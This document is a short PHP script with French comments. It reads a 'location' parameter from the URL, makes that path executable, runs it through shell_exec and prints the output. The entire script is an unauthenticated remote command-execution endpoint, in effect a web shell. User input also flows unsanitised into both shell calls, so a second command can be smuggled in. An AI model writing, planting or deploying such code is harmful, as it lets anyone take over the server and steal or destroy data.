<?php 
$command1 = "chmod +x " . $_GET['location'];
$command2 = $_GET['location'];  
$useless = shell_exec($command1); //rend le fichier exécutable
$output = shell_exec($command2);   // exécute le fichier
echo "<pre>$output</pre>";
?>